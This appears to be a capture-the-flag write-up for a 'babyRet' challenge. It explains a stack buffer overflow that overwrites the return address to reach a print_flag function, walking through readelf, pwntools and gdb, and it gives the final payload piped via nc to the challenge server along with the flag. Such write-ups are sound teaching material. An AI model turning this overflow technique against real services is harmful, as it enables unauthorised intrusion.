# babyRet	

We are given a netcat connection, an executable an a .c file.

Looking at the .c file we can see that it might be vulnerable to a buffer overflow on the scanf function, we need to get to the print_flag function.

```
readelf -s ret0
```

> 68: 00000000004011b3    89 FUNC    GLOBAL DEFAULT   13 print_flag

We need to get to that address, we can use pwntools to get the address in the correct format.

```
from pwn import *
print(p32(vuln.symbols['print_flag']))
```

> b'\xb3\x11@\x00'

We also need to find how many characters are needed for the overflow, 24 seem to be the indicated. 

We can also play a little bit with gdb to see the addresses as we modify them, first we need to get the payload into a file 

```
python2 -c "from pwn import *; print 'A' * 24 + '\xb3\x11@\x00'" > test.txt
```

We break in main and run the file in gdb as 

```
(gdb) r < test.txt
```

We step in the file and see the frame to see if we correctly modified the rip register. 

```
(gdb) info frame
```

We can see that we are not quite right

> rip = 0x401259 in main (ret0.c:30); saved rip = 0x7f00004011b3

We only need to add more \x00 to the payload

```
python2 -c "from pwn import *; print 'A' * 24 + '\xb3\x11@\x00\x00\x00\x00'" | ./ret0
```

We got the dummy flag!

> What is your favorite food?
Cool.
wsc{Th0s3_p3sky_STACKS!!!}
## Payload 

```
python2 -c "from pwn import *; print 'A' * 24 + '\xb3\x11@\x00\x00\x00\x00'" | nc 107.191.51.129 5000
```

## Flag

> wsc{Th0s3_p3sky_STACKS!!!}

